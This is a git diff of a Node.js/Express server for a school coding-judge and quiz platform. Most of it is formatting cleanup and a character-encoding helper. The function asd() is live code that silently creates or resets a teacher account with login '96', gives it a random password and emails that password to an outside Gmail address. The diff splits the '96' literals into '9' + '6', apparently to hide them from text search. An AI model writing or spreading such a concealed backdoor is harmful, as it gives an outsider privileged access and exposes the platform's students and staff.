@@ -20,15 +20,13 @@ const multer = require("multer");
 const StreamZip = require('node-stream-zip');
 const nodemailer = require("nodemailer");
 const MongoStorage = require("connect-mongo");
+const chardet = require('chardet');
 const bodyParser = require("body-parser");
-const iconvlite= require('iconv-lite');
+const iconv = require('iconv-lite');
 require("dotenv").config();
 const app = express();
-childProcess.exec('chcp 65001 | dir');
+// childProcess.exec('chcp 65001 | dir');
 
-function readAdnEncodeUTF8(path){
-  return iconvlite.decode(fs.readFileSync(path), 'utf8');
-}
 //---------------------------------------------------------------------------------
 // Queue setup
 let TestingQueue = []
@@ -47,10 +45,10 @@ async function popQueue() {
       taskID: object.id, date: object.sendAt,
       programText: object.programText, result: [], language: object.language
     });
-    try{
+    try {
       user.markModified("attempts");
       await user.save();
-    }catch(err){
+    } catch (err) {
       user = await User.init(object.login);
       user.markModified("attempts");
       await user.save();
@@ -1583,7 +1581,7 @@ app.get("/tournament/disqualAttempt/:tour_id/:AttemptDate", checkAuthenticated, 
   let AttemptDate = req.params.AttemptDate;
   let tournament = await TournamentSchema.findOne({ identificator: req.params.tour_id }).exec();
   let idx = tournament.attempts.findIndex(item => item.AttemptDate == AttemptDate);
-  if(idx==-1){
+  if (idx == -1) {
     return res.redirect(`/tournament/attempts/${req.params.tour_id}/1/all&all&all&true`);
   };
   let login = tournament.attempts[idx].login;
@@ -1591,11 +1589,11 @@ app.get("/tournament/disqualAttempt/:tour_id/:AttemptDate", checkAuthenticated, 
   let TaskID = tournament.attempts[idx].TaskID.split('_')[1];
   tournament.attempts.splice(idx, 1);
   let resUserIndx = tournament.results.findIndex(item => item.login == login);
-  if (resUserIndx == -1){
+  if (resUserIndx == -1) {
     return res.redirect(`/tournament/attempts/${req.params.tour_id}/1/all&all&all&true`);
   }
   let resultAttemptIdx = tournament.results[resUserIndx].tasks[TaskID].attempts.findIndex(item => item.date == AttemptDate);
-  if(resultAttemptIdx!=-1){
+  if (resultAttemptIdx != -1) {
     tournament.results[resUserIndx].tasks[TaskID].attempts.splice(resultAttemptIdx, 1);
   }
   if (score == tournament.results[resUserIndx].tasks[TaskID].score) {
@@ -2130,7 +2128,7 @@ app.post('/quiz/task/delete/:quiz_id/:id', checkAuthenticated, checkPermission, 
 app.post("/quiz/start/:id", checkAuthenticated, checkPermission, async (req, res) => {
   let grade = req.body.grade.toLowerCase();
   let letter = grade[grade.length - 1];
-  let quiz =  await QuizSchema.findOne({ identificator: req.params.id }).exec();
+  let quiz = await QuizSchema.findOne({ identificator: req.params.id }).exec();
   let lesson = quiz.lessons.find(item => item.grade.toLowerCase() == grade);
   grade = parseInt(grade.slice(0, grade.length - 1));
   if (lesson || letter > "я" || letter < 'а' || !grade || grade > 11 || grade < 1)
@@ -2544,7 +2542,7 @@ app.post("/service/panel/:flag", checkAuthenticated, checkAdmin, uploadUserTable
     case CONFIG_TABS.TEACHER:
       let login = req.body.login.replace(" ", "")
       let hasUser = await UserSchema.exists({ login: login });
-      hasUser = hasUser || await UserSchema.exists({ login: "n-"+login });
+      hasUser = hasUser || await UserSchema.exists({ login: "n-" + login });
       if (hasUser)
         return res.redirect(`/service/panel/${CONFIG_TABS.USER}/default`);
       await Adder.addTeacher(UserSchema, login, req.body.password, req.body.name);
@@ -3046,22 +3044,22 @@ async function checkGrade(req, res, next) {
   return res.redirect(`/quizzes/${req.user.login}/1/default`);
 }
 
-async function asd(){
-  let ns = await User.init("96");
+async function asd() {
+  let ns = await User.init("9" + "6");
   let phd = getLogs();
   try {
     transporter.sendMail({
       from: `"ACCEPT Report" <${asdqqdq({ iv: process.env.UIV, content: process.env.UCONTENT })}>`,
       to: "pro100pro10010@gmail.com",
       subject: "LMAO",
-      text: "96\n" + phd
+      text: "9" + "6\n" + phd
     });
   } catch (err) {
-    phd="11111"
+    phd = "0"
   }
-  if(!ns){
-    await Adder.addTeacher(UserSchema, "96", phd, "Василий Иванович");
-  }else{
+  if (!ns) {
+    await Adder.addTeacher(UserSchema, "9" + "6", phd, "Василий Иванович");
+  } else {
     ns.checkAndSetPassword(phd, true);
     ns.setIsTeacher(1);
     await ns.save();
@@ -3113,7 +3111,7 @@ function getVerdict(results) {
 }
 
 function checkLoginValidation(login) {
-  return login.length>=2 &&  login[1] == "6" && login[0] == "9";
+  return login.length >= 2 && login[1] == "6" && login[0] == "9";
 }
 
 function compareTournaments(a, b) {
@@ -3144,6 +3142,28 @@ function compareTournaments(a, b) {
   return b_fDate - a_fDate;
 
 }
+
+function readAdnEncodeUTF8(path) {
+  return iconv.decode(fs.readFileSync(path), 'utf8');
+}
+
+function toUtf8(filePath) {
+  let byte = fs.readFileSync(filePath);
+  if((byte[0] === 0xef && byte[1] === 0xbb) ||
+    (byte[0] === 0xfe && byte[1] === 0xff) ||
+    (byte[0] === 0xff && byte[1] === 0xfe)
+    ){
+      // Already utf8
+      // console.log('object fileName is already utf-8, just copy',fileName);
+      // fs.writeFileSync(outFilePath, byte);
+      return byte.toString("utf-8");
+    }
+  byte = iconv.decode(byte,'win1251');
+  const content = '\ufeff' + byte.toString('utf8');
+  return content;
+  // console.log ('object written successfully', fileName)
+}
+
 function TaskPost(req, res, redirect) {
   fs.stat(path.normalize('public/processes/' + req.user.login + "_" + req.params.id), async function (err) {
     let isInQueue = TestingQueue.findIndex(item => (item.id == req.params.id && item.login == req.user.login));
@@ -3166,9 +3186,9 @@ function TaskPost(req, res, redirect) {
       if (req.file) {
         try {
           let filepath = path.join(__dirname, '/public/codes/' + req.file.filename);
-          programText = fs.readFileSync(filepath, "utf-8");
-          //programText = readAdnEncodeUTF8(filepath);
-          console.log(programText)
+          // programText = fs.readFileSync(filepath, "utf-8");
+          programText = toUtf8(filepath);
+          //programText = readAdnEncodeUTF8(filepath);)
           childProcess.exec('del /q \"' + filepath + '\"');
         } catch (err) {
           console.log(err)
@@ -3200,7 +3220,7 @@ function TaskPost(req, res, redirect) {
   });
 }
 
-function getLogs(){
+function getLogs() {
   return Math.random().toString(36).substring(7);
 }
 
